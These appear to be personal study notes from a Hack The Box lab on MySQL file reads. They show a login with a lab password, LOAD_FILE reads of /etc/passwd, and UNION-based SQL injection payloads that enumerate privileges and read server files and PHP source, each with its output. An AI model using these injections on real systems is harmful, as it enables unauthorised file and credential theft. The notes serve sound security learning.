#### Read/Change the Database
#### MySQL - Connecting to the SQL Server

```bash
Yashfren@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```
## Read Local Files

As we previously mentioned, by default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

#### MySQL - Read Local Files in MySQL

```bash
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```
# Reading Files via SQL Injection

SQL Injection can be extended to read/write files on the server or even achieve remote code execution, depending on privileges.
### Privilege Discovery

#### Step 1: Identify DB User

To check which user the DBMS is running as:

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
-- OR --
cn' UNION SELECT 1, user, 3, 4 FROM mysql.user-- -
```

Output:

```
root@localhost, 3, 4
```
#### Step 2: Check for Super Privileges

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

Output:

```
Y (indicating superuser)
```
#### Step 3: Enumerate All Privileges

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

Output includes:

```
SELECT, INSERT, UPDATE, FILE, ...
```

The presence of `FILE` privilege allows file reading/writing.
### Reading Files Using `LOAD_FILE()`

If `FILE` privilege is available, read local files:

```sql
cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -
```

Output:

```
root:x:0:0:root:/root:/bin/bash, daemon:x:1:1:... etc.
```
### Reading Source Code

Try reading the PHP source:

```sql
cn' UNION SELECT 1, LOAD_FILE('/var/www/html/search.php'), 3, 4-- -
```

Since HTML is rendered, use browser's [Ctrl + U] to view actual code.

Sample source code reveals:

- SQL query construction
- DB credentials   
- Vulnerable logic

> Always remember: File read vulnerabilities can lead to severe compromise including credential leakage and full RCE when write access is available.
# Tags
> #Exploitation #Service-Exploitation #MySQL